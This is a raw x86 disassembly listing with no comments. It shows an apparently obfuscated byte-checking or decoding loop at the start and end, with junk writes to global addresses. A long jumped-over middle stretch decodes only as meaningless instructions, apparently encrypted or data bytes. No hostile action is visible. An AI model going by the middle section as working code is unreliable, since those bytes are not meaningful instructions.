  40495c:	add    DWORD PTR ds:0x42fd05,0x42e134
  404966:	movzx  eax,ax
  404969:	and    DWORD PTR ds:0x42fd7a,0x42fcf9
  404973:	mov    DWORD PTR [ebp-0x14],eax
  404976:	sbb    DWORD PTR ds:0x42fd7e,0xc63
  404980:	mov    eax,DWORD PTR [ebp+0x8]
  404983:	add    DWORD PTR ds:0x42e703,0x6bf6
  40498d:	movzx  eax,WORD PTR [eax+edx*4]
  404991:	sbb    DWORD PTR ds:0x42fd82,0x42fd7e
  40499b:	xor    eax,0x8a3e
  4049a0:	add    DWORD PTR ds:0x42e707,0x26eb
  4049aa:	jmp    0x404d0a
  4049af:	fdiv   QWORD PTR [esi]
  4049b1:	dec    esp
  4049b2:	rsqrtps xmm6,XMMWORD PTR [ecx+0x5b]
  4049b6:	icebp  
  4049b7:	inc    eax
  4049b8:	sub    esp,DWORD PTR [ebp-0x15]
  4049bb:	bound  ebx,QWORD PTR [eax+0x21c98c17]
  4049c1:	jo     0x404a33
  4049c3:	cmp    eax,0x2a70707d
  4049c8:	jl     0x404a0c
  4049ca:	add    eax,0x176eb59f
  4049cf:	cmp    eax,0x6d6ee6c0
  4049d4:	ds and al,0xd1
  4049d7:	pusha  
  4049d8:	(bad)  
  4049d9:	in     eax,0xd3
  4049db:	xchg   ebp,eax
  4049dc:	lods   al,BYTE PTR ss:[esi]
  4049de:	mov    BYTE PTR [ecx+ebx*2],al
  4049e1:	fdivr  DWORD PTR [ebp-0x58]
  4049e4:	or     bl,BYTE PTR [esi]
  4049e6:	push   ecx
  4049e7:	dec    esp
  4049e8:	mov    edi,DWORD PTR [eax+0x77]
  4049eb:	in     al,dx
  4049ec:	enter  0x5757,0x79
  4049f0:	add    ebx,DWORD PTR [edx]
  4049f2:	ss or  bl,dl
  4049f5:	shl    DWORD PTR [esi+0x6d],0xe0
  4049f9:	push   esi
  4049fa:	xlat   BYTE PTR ds:[ebx]
  4049fb:	mov    al,0xa3
  4049fd:	jge    0x4049b9
  4049ff:	fist   DWORD PTR [ecx*1-0x524f1b89]
  404a06:	aad    0xb5
  404a08:	ds pop ecx
  404a0a:	xchg   ebp,eax
  404a0b:	aas    
  404a0c:	dec    edi
  404a0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a0e:	cmp    bl,BYTE PTR [ebx-0x2b32e2e1]
  404a14:	call   0x4424:0x192b0390
  404a1b:	js     0x404a6a
  404a1d:	jbe    0x404a95
  404a1f:	xor    eax,0x7b63e126
  404a24:	push   0xfffffff2
  404a26:	outs   dx,DWORD PTR ds:[esi]
  404a27:	xchg   ecx,eax
  404a28:	hlt    
  404a29:	push   0xfffffff4
  404a2b:	aad    0x1c
  404a2d:	dec    ebx
  404a2e:	outs   dx,BYTE PTR ds:[esi]
  404a2f:	push   es
  404a30:	je     0x4049dc
  404a32:	rep lods eax,DWORD PTR ds:[esi]
  404a34:	xor    DWORD PTR [ecx+0x28027021],edx
  404a3a:	sub    edx,edx
  404a3c:	repnz test DWORD PTR [esp+eax*4+0x2dbabb79],edx
  404a44:	cs xor eax,0x710110a1
  404a4a:	pop    edx
  404a4b:	neg    dh
  404a4d:	les    edx,FWORD PTR [esi+0x69]
  404a50:	(bad)  
  404a51:	fsubr  QWORD PTR [esi+0x2b]
  404a54:	shr    BYTE PTR [edx],0x7f
  404a57:	icebp  
  404a58:	dec    esp
  404a59:	or     al,0x6
  404a5b:	mov    edx,ecx
  404a5d:	punpcklwd mm6,mm5
  404a60:	add    eax,0x7bc1be0c
  404a65:	popf   
  404a66:	jl     0x4049f4
  404a68:	push   esi
  404a69:	mov    al,0xf9
  404a6b:	sti    
  404a6c:	inc    edi
  404a6d:	cld    
  404a6e:	xor    dh,BYTE PTR [edi-0x729b5052]
  404a74:	and    BYTE PTR [bx+di-0x5a],bl
  404a78:	jbe    0x404a8f
  404a7a:	sbb    ah,BYTE PTR [edi+0x2c]
  404a7d:	sub    eax,DWORD PTR [ebx]
  404a7f:	and    al,0x99
  404a81:	dec    ebx
  404a82:	lds    esp,FWORD PTR [ebp-0x6070c77f]
  404a88:	cmp    DWORD PTR [edi],0xffffffc1
  404a8b:	std    
  404a8c:	xlat   BYTE PTR ds:[ebx]
  404a8d:	sbb    DWORD PTR [ebp+0x25e28203],0x75
  404a94:	jbe    0x404ad2
  404a96:	rcr    edx,0xc1
  404a99:	fnstenv [ebx]
  404a9b:	hlt    
  404a9c:	enter  0xfc05,0x7f
  404aa0:	push   esp
  404aa1:	mul    esi
  404aa3:	sar    BYTE PTR [ebx-0x51],1
  404aa6:	int3   
  404aa7:	mov    ecx,0x31a55af1
  404aac:	ret    
  404aad:	cs and al,0xe4
  404ab0:	pop    ds
  404ab1:	cmp    ebp,DWORD PTR [edx+0x5ed049c2]
  404ab7:	pop    ds
  404ab8:	xchg   ebp,eax
  404ab9:	daa    
  404aba:	hlt    
  404abb:	mov    dl,0x17
  404abd:	ret    0x8cf6
  404ac0:	ror    BYTE PTR fs:[ebx-0x7a1bf62b],0x29
  404ac8:	xchg   ebx,eax
  404ac9:	or     bl,BYTE PTR [edi+esi*4-0xb]
  404acd:	adc    BYTE PTR [ecx-0x43c3b684],ah
  404ad3:	or     BYTE PTR ds:0x2c10b81c,ch
  404ad9:	sti    
  404ada:	shr    DWORD PTR [ebp-0xce8a1f4],1
  404ae0:	xchg   edi,eax
  404ae1:	jmp    0x297565bd
  404ae6:	push   0x39570c80
  404aeb:	sbb    al,0xab
  404aed:	int    0x49
  404aef:	push   ebx
  404af0:	push   cs
  404af1:	sub    al,0x58
  404af3:	mov    BYTE PTR [edi-0x1f],bl
  404af6:	and    eax,esp
  404af8:	xchg   edi,eax
  404af9:	(bad)  
  404afa:	sbb    al,0x12
  404afc:	ficom  DWORD PTR [edi-0x50d799a4]
  404b02:	in     eax,0x52
  404b04:	stc    
  404b05:	push   esp
  404b06:	cmc    
  404b07:	mov    al,ds:0x39eb3e
  404b0c:	ins    DWORD PTR es:[edi],dx
  404b0d:	test   DWORD PTR [ecx-0x16e2efab],edi
  404b13:	test   al,0xdf
  404b15:	(bad)  
  404b16:	mov    ebp,esi
  404b18:	jo     0x404b4c
  404b1a:	xor    BYTE PTR [esi-0x14e6312c],bl
  404b20:	xchg   esp,eax
  404b21:	neg    esp
  404b23:	call   0x27c641be
  404b28:	jo     0x404b8e
  404b2a:	push   edi
  404b2b:	sub    DWORD PTR [eax],ebx
  404b2d:	sub    ebp,DWORD PTR [ecx]
  404b2f:	leave  
  404b30:	inc    ebp
  404b31:	cmp    eax,DWORD PTR [ebp+0x576bf9ab]
  404b37:	mov    dh,0xfc
  404b39:	sub    DWORD PTR [ecx-0x7c],esi
  404b3c:	jno    0x404ad8
  404b3e:	inc    bh
  404b40:	cld    
  404b41:	faddp  st(2),st
  404b44:	and    bh,cl
  404b46:	pop    edx
  404b47:	dec    esp
  404b48:	fcomp  QWORD PTR [esi-0x4cdc39ae]
  404b4e:	lods   eax,DWORD PTR ds:[esi]
  404b4f:	sbb    BYTE PTR [esi+0x106e7f70],0x72
  404b56:	and    al,0xfe
  404b58:	jns    0x404ade
  404b5a:	jmp    0x404b24
  404b5c:	rol    edx,1
  404b5e:	fst    DWORD PTR [edx]
  404b60:	adc    ch,BYTE PTR [esi]
  404b62:	sub    ch,bh
  404b64:	dec    ebp
  404b65:	rol    BYTE PTR [ebp-0x272d9c8],1
  404b6b:	xlat   BYTE PTR ds:[ebx]
  404b6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b6d:	jmp    0x404b9d
  404b6f:	sbb    BYTE PTR [eax],bh
  404b71:	xor    eax,DWORD PTR [ebx-0x641f9a1f]
  404b77:	cmc    
  404b78:	lods   al,BYTE PTR ds:[esi]
  404b79:	call   0xa1e1:0x31ceef3a
  404b80:	inc    edi
  404b81:	adc    eax,0xa592835c
  404b86:	das    
  404b87:	mov    ecx,0x96ccc491
  404b8c:	xor    al,0x65
  404b8e:	fbld   TBYTE PTR [edi]
  404b90:	std    
  404b91:	pop    ss
  404b92:	popa   
  404b93:	or     al,0x4a
  404b95:	xchg   ebx,eax
  404b96:	popf   
  404b97:	rcr    BYTE PTR [ebp+0x50ae803e],cl
  404b9d:	popa   
  404b9e:	loop   0x404b29
  404ba0:	or     esp,ecx
  404ba2:	mov    edi,DWORD PTR [ecx+0x7c]
  404ba5:	mov    bl,0x0
  404ba7:	pop    esi
  404ba8:	sahf   
  404ba9:	push   edi
  404baa:	adc    al,0x8f
  404bac:	push   ebx
  404bad:	lea    edx,[edi+0x1d6bb059]
  404bb3:	aaa    
  404bb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bb5:	je     0x404be0
  404bb7:	in     eax,dx
  404bb8:	addr16 ds mov eax,0x1f928402
  404bbf:	scas   al,BYTE PTR es:[edi]
  404bc0:	mov    esi,0x1aae675a
  404bc5:	sub    ah,BYTE PTR [ebx+0xa728042]
  404bcb:	push   ds
  404bcc:	push   edx
  404bcd:	add    BYTE PTR [edi+0x37],dh
  404bd0:	mov    BYTE PTR [edi],al
  404bd2:	mov    ds:0xb5aa29fb,al
  404bd7:	xchg   esp,eax
  404bd8:	adc    al,0x34
  404bda:	dec    ebx
  404bdb:	xor    eax,0xdbcfe532
  404be0:	fist   DWORD PTR [eax+0x39]
  404be3:	mov    BYTE PTR [edx],cl
  404be5:	mul    DWORD PTR [ecx]
  404be7:	jno    0x404c2a
  404be9:	nop
  404bea:	cmp    eax,0x95bcae2e
  404bef:	cmp    cl,BYTE PTR [eax-0x68]
  404bf2:	adc    ebp,esi
  404bf4:	dec    esi
  404bf5:	ins    DWORD PTR es:[edi],dx
  404bf6:	cmp    esi,DWORD PTR [eax-0x25]
  404bf9:	or     ah,BYTE PTR [ebp-0xbc33b90]
  404bff:	lea    esi,[edi+0x6562e7d7]
  404c05:	mov    WORD PTR ds:0x7cab2515,?
  404c0b:	sub    al,0x9
  404c0d:	lods   al,BYTE PTR ds:[esi]
  404c0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c0f:	jge    0x404c2f
  404c11:	sahf   
  404c12:	cdq    
  404c13:	push   ss
  404c14:	(bad)  
  404c15:	jp     0x404b9a
  404c17:	sar    dh,0x3a
  404c1a:	pop    ebx
  404c1b:	inc    esi
  404c1c:	test   al,0x74
  404c1e:	fcmovb st,st(2)
  404c20:	pop    ebp
  404c21:	es pop ds
  404c23:	test   BYTE PTR [ebp-0x6],bl
  404c26:	pop    eax
  404c27:	arpl   WORD PTR [edx+0x3c],si
  404c2a:	(bad)  
  404c2b:	rcr    DWORD PTR [ebx],cl
  404c2d:	cmp    BYTE PTR [eax+edx*8+0x20c72b86],bh
  404c34:	pushf  
  404c35:	icebp  
  404c36:	test   BYTE PTR [ebp+0x3a1925c7],bh
  404c3c:	push   ds
  404c3d:	outs   dx,DWORD PTR ds:[esi]
  404c3e:	adc    al,0x77
  404c40:	lods   eax,DWORD PTR ds:[esi]
  404c41:	pop    eax
  404c42:	stos   BYTE PTR es:[edi],al
  404c43:	mov    ds:0x7c16cebc,eax
  404c48:	pushf  
  404c49:	cli    
  404c4a:	sar    BYTE PTR [eax],cl
  404c4c:	test   ebp,ecx
  404c4e:	je     0x404cce
  404c50:	out    0x6,eax
  404c52:	xchg   esp,eax
  404c53:	fcom   DWORD PTR [ebx+0x16]
  404c56:	mov    dh,BYTE PTR [ecx+ebx*4+0x3e]
  404c5a:	sbb    al,0x50
  404c5c:	lea    ebp,[esi-0x742bd83b]
  404c62:	jg     0x404c1b
  404c64:	sbb    eax,0xa1ceb0f0
  404c69:	push   ecx
  404c6a:	cmp    ebx,DWORD PTR [eax-0x4e]
  404c6d:	push   edx
  404c6e:	cwde   
  404c6f:	sub    DWORD PTR [ebx+edx*4+0xdb463eb],edi
  404c76:	push   ss
  404c77:	or     cl,BYTE PTR [ebp-0x31]
  404c7a:	das    
  404c7b:	ins    DWORD PTR es:[edi],dx
  404c7c:	stos   DWORD PTR es:[edi],eax
  404c7d:	jbe    0x404cca
  404c7f:	jb     0x404ce6
  404c81:	pop    ss
  404c82:	ret    
  404c83:	xlat   BYTE PTR ds:[ebx]
  404c84:	stos   DWORD PTR es:[edi],eax
  404c85:	and    DWORD PTR [esi+0x3d],esi
  404c88:	push   es
  404c89:	lods   eax,DWORD PTR ds:[esi]
  404c8a:	test   dl,0xde
  404c8d:	cmp    edx,edx
  404c8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c90:	aad    0x89
  404c92:	cld    
  404c93:	cld    
  404c94:	xor    BYTE PTR [edi+0x50287d29],bl
  404c9a:	mov    ds:0xd52b637,eax
  404c9f:	cld    
  404ca0:	mov    ds:0x71e566fc,al
  404ca5:	pop    esi
  404ca6:	xchg   edi,eax
  404ca7:	aad    0xb1
  404ca9:	(bad)  
  404cab:	jnp    0x404c9a
  404cad:	mov    ds,WORD PTR [edi]
  404caf:	ret    
  404cb0:	(bad)  
  404cb1:	mov    esp,0x326010ae
  404cb6:	cmp    ebx,DWORD PTR [ebx+0x61920148]
  404cbc:	ss push 0xffffffb1
  404cbf:	pop    ss
  404cc0:	pop    edi
  404cc1:	jle    0x404c6f
  404cc3:	jo     0x404caf
  404cc5:	(bad)  
  404cc6:	push   edx
  404cc7:	push   ds
  404cc8:	jne    0x404ce2
  404cca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ccb:	cs sbb dh,bh
  404cce:	mul    DWORD PTR [edx-0x18]
  404cd1:	cmp    eax,0xe19df1eb
  404cd6:	cmp    esi,DWORD PTR [esi]
  404cd8:	xchg   esi,eax
  404cd9:	mov    al,0x45
  404cdb:	push   0xd68cd8c
  404ce0:	push   ebx
  404ce1:	pop    es
  404ce2:	std    
  404ce3:	dec    edx
  404ce4:	xchg   esi,eax
  404ce5:	jmp    0x5efa:0xdc96db1
  404cec:	add    eax,0x30577c90
  404cf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404cf2:	test   DWORD PTR [esi],0xce7e0c67
  404cf8:	ins    DWORD PTR es:[edi],dx
  404cf9:	cwde   
  404cfa:	push   ss
  404cfb:	pop    ds
  404cfc:	xchg   esp,eax
  404cfd:	mov    DWORD PTR [ebp+edi*1-0x25],ecx
  404d01:	enter  0x3ede,0x86
  404d05:	pinsrw mm3,WORD PTR ds:0xc703a437,0xc7
  404d0d:	add    eax,0x42e6ff
  404d12:	pop    eax
  404d13:	push   cs
  404d14:	add    BYTE PTR [eax],al
  404d16:	mov    edi,DWORD PTR [ebp-0x14]
  404d19:	mov    DWORD PTR ds:0x42e6eb,0x3918
  404d23:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404d27:	jmp    0x405087
  404d2c:	or     DWORD PTR [ebp-0x1d],esi
  404d2f:	daa    
  404d30:	arpl   WORD PTR [ecx+0x5bcd71c9],si
  404d36:	fisttp QWORD PTR [eax+0x2b]
  404d39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d3a:	cli    
  404d3b:	fcom   DWORD PTR [esi+0x3d70702e]
  404d41:	jge    0x404db3
  404d43:	jo     0x404d97
  404d45:	push   ebx
  404d46:	jle    0x404d7d
  404d48:	jp     0x404dc2
  404d4a:	addr16 ret 
  404d4c:	out    0xff,eax
  404d4e:	fcmovb st,st(0)
  404d50:	adc    BYTE PTR [edi-0x558ce8d],dh
  404d56:	add    eax,0xe8ddcada
  404d5b:	add    eax,0x659525ec
  404d60:	daa    
  404d61:	xchg   DWORD PTR [edi+0x234c6661],eax
  404d67:	cli    
  404d68:	lea    esp,[ebx]
  404d6a:	ret    
  404d6b:	mov    ebx,?
  404d6d:	bound  ecx,QWORD PTR [eax-0x11cf694]
  404d73:	push   eax
  404d74:	out    0x2a,al
  404d76:	sbb    ebp,ebp
  404d78:	mov    ss,WORD PTR [edx]
  404d7a:	inc    edi
  404d7b:	or     eax,0x360a6dc3
  404d80:	sbb    eax,ebx
  404d82:	xor    eax,0x7bfd24bf
  404d87:	jmp    0x283114c1
  404d8c:	rcl    BYTE PTR [edx-0x33],cl
  404d8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d90:	xor    al,0xd2
  404d92:	mov    ah,0xb
  404d94:	jmp    0x97d4a676
  404d99:	add    al,0x5e
  404d9b:	mov    bh,0x34
  404d9d:	jge    0x404d98
  404d9f:	lds    esp,FWORD PTR [esi-0x4f45a44c]
  404da5:	or     al,0xb6
  404da7:	shl    edi,cl
  404da9:	ins    DWORD PTR es:[edi],dx
  404daa:	dec    BYTE PTR [esi]
  404dac:	add    ebp,DWORD PTR [eax]
  404dae:	and    BYTE PTR [ebx],dl
  404db0:	leave  
  404db1:	dec    eax
  404db2:	cmp    eax,0xd12ef85c
  404db7:	jecxz  0x404df1
  404db9:	jmp    0x11dfcdca
  404dbe:	inc    ecx
  404dbf:	pop    es
  404dc0:	jb     0x404d54
  404dc2:	rcl    BYTE PTR [ebx],0x9c
  404dc5:	or     ch,BYTE PTR [ebx+0xe]
  404dc8:	pusha  
  404dc9:	inc    esp
  404dca:	(bad)  
  404dcb:	in     al,dx
  404dcc:	pop    ebp
  404dcd:	in     al,dx
  404dce:	inc    ecx
  404dcf:	or     eax,DWORD PTR [esi+ebx*1-0x4fb31f7f]
  404dd6:	imul   esi,DWORD PTR [eax],0x5184ec10
  404ddc:	adc    dh,BYTE PTR [edi+0x3]
  404ddf:	pop    ebx
  404de0:	mov    al,ds:0xe8f41267
  404de5:	loop   0x404dbd
  404de7:	mov    ebp,0xc41e3f7e
  404dec:	rcr    BYTE PTR [esi],1
  404dee:	(bad)  
  404def:	fild   QWORD PTR [ecx+0x7dd8edda]
  404df5:	test   BYTE PTR [esi+esi*4+0x14],0x9c
  404dfa:	ins    DWORD PTR es:[edi],dx
  404dfb:	jl     0x404dc7
  404dfd:	ss hlt 
  404dff:	popa   
  404e00:	loope  0x404ddb
  404e02:	add    esi,DWORD PTR [eax+edx*2-0x3d]
  404e06:	scas   eax,DWORD PTR es:[edi]
  404e07:	iret   
  404e08:	sbb    edx,ebp
  404e0a:	retf   
  404e0b:	pop    esp
  404e0c:	aas    
  404e0d:	rcr    ch,1
  404e0f:	in     al,0xc
  404e11:	cmp    al,0xc7
  404e13:	lods   al,BYTE PTR ds:[esi]
  404e14:	jg     0x404dd9
  404e16:	lods   eax,DWORD PTR ds:[esi]
  404e17:	add    BYTE PTR [edx-0x7f],ah
  404e1a:	in     al,0x74
  404e1c:	mov    eax,0x790c6ace
  404e21:	dec    edi
  404e22:	je     0x404e85
  404e24:	jp     0x404e5e
  404e26:	stos   BYTE PTR es:[edi],al
  404e27:	jns    0x404e43
  404e29:	stos   BYTE PTR es:[edi],al
  404e2a:	cmp    bh,BYTE PTR [eax+0x28]
  404e2d:	or     DWORD PTR [edx-0x32203ece],esp
  404e33:	adc    eax,0xd0616ed
  404e38:	jge    0x404deb
  404e3a:	pop    ss
  404e3b:	out    dx,eax
  404e3c:	inc    ebx
  404e3d:	push   edx
  404e3e:	mov    al,ds:0x894b8b66
  404e43:	adc    edx,DWORD PTR [eax+eiz*1]
  404e46:	int3   
  404e47:	xor    al,0x15
  404e49:	call   0x6620:0x16511715
  404e50:	push   0xffffffbf
  404e52:	xlat   BYTE PTR ds:[ebx]
  404e53:	mov    DWORD PTR [edx],0x8b11b357
  404e59:	pop    esp
  404e5a:	or     ecx,DWORD PTR [edi-0x43bc329b]
  404e60:	xchg   ebp,eax
  404e61:	(bad)  
  404e62:	dec    esp
  404e63:	sahf   
  404e64:	add    BYTE PTR [edi+ebx*4],bl
  404e67:	cld    
  404e68:	mov    ebx,0xdd38192f
  404e6d:	out    0x6c,al
  404e6f:	call   0xafdcefa0
  404e74:	js     0x404eaf
  404e76:	retf   
  404e77:	stos   BYTE PTR es:[edi],al
  404e78:	xchg   esi,eax
  404e79:	popf   
  404e7a:	pop    edi
  404e7b:	jp     0x404e7a
  404e7d:	mov    edx,0x4ae89740
  404e82:	fwait
  404e83:	in     eax,dx
  404e84:	sub    DWORD PTR [eax-0x78],eax
  404e87:	mov    edx,0x411d0563
  404e8c:	or     cl,ah
  404e8e:	inc    eax
  404e8f:	add    al,0x95
  404e91:	cld    
  404e92:	fwait
  404e93:	retf   0x1f26
  404e96:	xchg   ecx,eax
  404e97:	ret    
  404e98:	add    eax,0xc8d05e31
  404e9d:	pop    esp
  404e9e:	cmp    edx,DWORD PTR [ebx+0x13]
  404ea1:	fwait
  404ea2:	ror    BYTE PTR [ecx-0x3c26f2ab],1
  404ea8:	(bad)  
  404ea9:	mov    ebp,0xd2d17225
  404eae:	xor    eax,0x8e9aa229
  404eb3:	imul   esi
  404eb5:	inc    esp
  404eb6:	clc    
  404eb7:	sub    BYTE PTR [ebx],bl
  404eb9:	js     0x404e6f
  404ebb:	jp     0x404ec3
  404ebd:	call   0xfc65e935
  404ec2:	jo     0x404eb1
  404ec4:	call   0xea9a:0x9a7a1443
  404ecb:	dec    ebp
  404ecc:	stos   DWORD PTR es:[edi],eax
  404ecd:	or     eax,edi
  404ecf:	out    0x9d,eax
  404ed1:	test   DWORD PTR [esi-0x6c134a59],0xcc13cb38
  404edb:	sbb    ch,BYTE PTR [ebx+0x2d5ddb1f]
  404ee1:	inc    esp
  404ee2:	inc    edx
  404ee3:	out    dx,eax
  404ee4:	fcom   QWORD PTR [esi+0x5b3ad2c3]
  404eea:	std    
  404eeb:	sub    al,0xd6
  404eed:	enter  0xd833,0xce
  404ef1:	div    BYTE PTR [ebx-0x1a]
  404ef4:	je     0x404e77
  404ef6:	inc    ebx
  404ef7:	xchg   edx,eax
  404ef8:	std    
  404ef9:	inc    ebp
  404efa:	ret    0xaad4
  404efd:	out    0x7e,eax
  404eff:	lahf   
  404f00:	mov    BYTE PTR [ecx],bh
  404f02:	mov    bh,0xe9
  404f05:	mov    dl,0xd2
  404f07:	(bad)
  404f0b:	pop    esp
  404f0c:	xor    DWORD PTR [ebx-0x8],ebp
  404f0f:	pop    esp
  404f10:	out    0xb4,al
  404f12:	xchg   edx,eax
  404f13:	xor    eax,0xf83319a6
  404f18:	add    BYTE PTR [esi],dl
  404f1a:	outs   dx,BYTE PTR ds:[esi]
  404f1b:	push   esi
  404f1c:	loope  0x404f70
  404f1e:	sub    BYTE PTR [edi],cl
  404f20:	pop    ds
  404f21:	ret    0xba58
  404f24:	(bad)  
  404f25:	sbb    eax,DWORD PTR [edx+0x5d15bcc]
  404f2b:	imul   ebx,DWORD PTR [eax-0x145ace19],0x179f3150
  404f35:	adc    eax,DWORD PTR [edx+esi*4+0x1bb4875c]
  404f3c:	pop    ds
  404f3d:	stc    
  404f3e:	xchg   ah,ah
  404f40:	jne    0x404ec3
  404f42:	lods   al,BYTE PTR ds:[esi]
  404f43:	popa   
  404f44:	mov    WORD PTR [edx+0x30],?
  404f47:	aam    0x94
  404f49:	add    ah,BYTE PTR [esi]
  404f4b:	dec    edx
  404f4c:	sbb    BYTE PTR [ebp+0xeb52c63],cl
  404f52:	lods   eax,DWORD PTR ds:[esi]
  404f53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f54:	adc    esp,DWORD PTR [ecx+0x3bbddcb2]
  404f5a:	push   ebp
  404f5b:	popf   
  404f5c:	into   
  404f5d:	fsubr  QWORD PTR [ebx]
  404f5f:	mov    dl,0xd0
  404f61:	cmp    eax,0xf303c258
  404f66:	sti    
  404f67:	std    
  404f68:	push   esp
  404f69:	push   ecx
  404f6a:	sub    al,0xa0
  404f6c:	mov    dh,0xd1
  404f6e:	mov    ebp,0xdf233d6f
  404f73:	test   al,0xc8
  404f75:	or     BYTE PTR [eax+eax*8-0x55d6acd5],cl
  404f7c:	push   ds
  404f7d:	jnp    0x404fd7
  404f7f:	and    DWORD PTR [ecx+0x2114231a],ecx
  404f85:	js     0x404f3b
  404f87:	xchg   esp,eax
  404f88:	div    BYTE PTR [esi]
  404f8a:	icebp  
  404f8b:	push   ebp
  404f8c:	aaa    
  404f8d:	call   0x4c1c:0xca538c9f
  404f94:	mov    ebx,0xf636cc99
  404f99:	jb     0x404faf
  404f9b:	enter  0xb7,0x47
  404f9f:	nop
  404fa0:	xor    BYTE PTR [ebx-0x18],dl
  404fa3:	aas    
  404fa4:	data16 ss icebp 
  404fa7:	and    al,al
  404fa9:	cmp    eax,0xdc339e87
  404fae:	shl    DWORD PTR [eax],1
  404fb0:	int    0x43
  404fb2:	pushf  
  404fb3:	sahf   
  404fb4:	jno    0x40501b
  404fb6:	ja     0x404fb5
  404fb8:	lods   al,BYTE PTR ds:[esi]
  404fb9:	sub    DWORD PTR [edi-0x80],ebx
  404fbc:	sub    eax,0x329d383a
  404fc1:	es mov ebp,0x315473a8
  404fc7:	lods   al,BYTE PTR ds:[esi]
  404fc8:	jge    0x405011
  404fca:	icebp  
  404fcb:	pop    ebp
  404fcc:	inc    esp
  404fcd:	test   eax,0xd777884
  404fd2:	xchg   ebp,eax
  404fd3:	xchg   bl,ch
  404fd5:	shl    cl,cl
  404fd7:	arpl   WORD PTR ds:0x2a47ab8d,cx
  404fdd:	push   0x320b1b3f
  404fe2:	pop    es
  404fe3:	add    DWORD PTR [eax+esi*2-0x44489bfb],esi
  404fea:	std    
  404feb:	(bad)  
  404fec:	in     al,0x68
  404fee:	in     al,0xd6
  404ff0:	xchg   ebp,eax
  404ff1:	je     0x404fd5
  404ff3:	pop    ds
  404ff4:	add    eax,0x4c14ab55
  404ff9:	dec    eax
  404ffa:	imul   ebx,DWORD PTR [esi+0x5a],0xb5a2c16f
  405001:	jl     0x404fb8
  405003:	cmp    al,0xde
  405005:	(bad)  
  405006:	xchg   esi,ebx
  405008:	pop    ebp
  405009:	push   eax
  40500a:	push   ecx
  40500b:	pop    ss
  40500c:	fisub  WORD PTR [ebp-0x73]
  40500f:	call   DWORD PTR [edi+edx*2-0x29]
  405013:	jb     0x40500b
  405015:	(bad)  
  405016:	lahf   
  405017:	dec    edi
  405018:	xchg   edi,eax
  405019:	aam    0xbf
  40501b:	push   edx
  40501c:	(bad)  
  40501d:	jne    0x404fc7
  40501f:	mov    ?,ecx
  405021:	jle    0x40503f
  405023:	adc    eax,0x402d3c18
  405028:	inc    ebx
  405029:	add    al,0xef
  40502b:	push   0xfffffff3
  40502d:	jae    0x4050a1
  40502f:	mov    DWORD PTR [ecx+0x2f3a5183],ebp
  405035:	xchg   ecx,eax
  405037:	outs   dx,BYTE PTR ds:[esi]
  405038:	push   esi
  405039:	inc    edi
  40503a:	mov    DWORD PTR [ecx],ecx
  40503c:	push   ebp
  40503d:	icebp  
  40503e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40503f:	(bad)  
  405040:	dec    esp
  405041:	mov    edx,0x45cf1d80
  405046:	push   esi
  405047:	into   
  405048:	sbb    BYTE PTR [edx+esi*4+0x12],ah
  40504c:	add    eax,0x7b9e583f
  405051:	cmp    eax,0x9a08764d
  405056:	mov    esi,0xd3ca1505
  40505b:	and    esp,DWORD PTR [edx]
  40505d:	sbb    BYTE PTR [edx],bl
  40505f:	ja     0x405025
  405061:	mov    WORD PTR [eax+0x7e],ds
  405064:	adc    edi,0xffffffef
  405067:	cld    
  405068:	aam    0xc
  40506a:	repz popf 
  40506c:	adc    bl,BYTE PTR [esi+0x767cb47]
  405072:	fbld   TBYTE PTR [ebx]
  405074:	(bad)  
  405075:	bound  ebx,QWORD PTR [ebx+0x28]
  405078:	mov    edi,0xce04da20
  40507d:	push   ebp
  40507e:	sahf   
  40507f:	dec    edx
  405080:	(bad)  
  405081:	or     esp,DWORD PTR [edi+0x6420c03f]
  405087:	mov    eax,DWORD PTR [ebp-0xc]
  40508a:	inc    edx
  40508b:	cmp    edx,eax
  40508d:	jne    0x40493d
  405093:	pop    edi
  405094:	pop    ebx
  405095:	mov    eax,DWORD PTR [ebp-0x8]
  405098:	mov    edx,DWORD PTR [ebp+0x10]
  40509b:	xor    eax,ecx
  40509d:	add    eax,esi
  40509f:	mov    DWORD PTR [edx],eax
  4050a1:	mov    eax,DWORD PTR [ebp-0x8]
  4050a4:	xor    eax,ecx
  4050a6:	add    eax,esi
  4050a8:	mov    DWORD PTR [ebp+0x8],eax
  4050ab:	mov    eax,DWORD PTR [ebp+0x8]
  4050ae:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050b2:	mov    dl,BYTE PTR [ebp-0x1]
  4050b5:	cmp    al,dl
  4050b7:	je     0x4050fa
  4050bd:	mov    eax,DWORD PTR [ebp+0x8]
  4050c0:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050c4:	mov    edx,DWORD PTR [ebp+0xc]
  4050c7:	cmp    al,BYTE PTR [edx]
  4050c9:	jne    0x405480
  4050cf:	mov    eax,DWORD PTR [ebp-0x8]
  4050d2:	mov    edx,DWORD PTR [ebp+0xc]
  4050d5:	movsx  edx,BYTE PTR [edx]
  4050d8:	xor    eax,ecx
  4050da:	add    eax,esi
  4050dc:	cmp    edx,eax
  4050de:	je     0x405114
  4050e4:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4050eb:	lea    eax,[ebp-0x18]
  4050ee:	mov    DWORD PTR [ebp-0x14],eax
  4050f1:	mov    eax,DWORD PTR [ebp-0x14]
  4050f4:	add    DWORD PTR [eax],0x705fa8f
  4050fa:	mov    eax,DWORD PTR [ebp-0x10]
  4050fd:	mov    edx,DWORD PTR [ebp+0x8]
  405100:	xor    eax,ecx
  405102:	lea    eax,[eax+edx*1+0x32729c]
  405109:	mov    DWORD PTR [ebp+0x8],eax
  40510c:	inc    DWORD PTR [ebp+0xc]
  40510f:	jmp    0x4050ab
  405114:	mov    eax,DWORD PTR [ebp-0x10]
  405117:	xor    eax,ecx
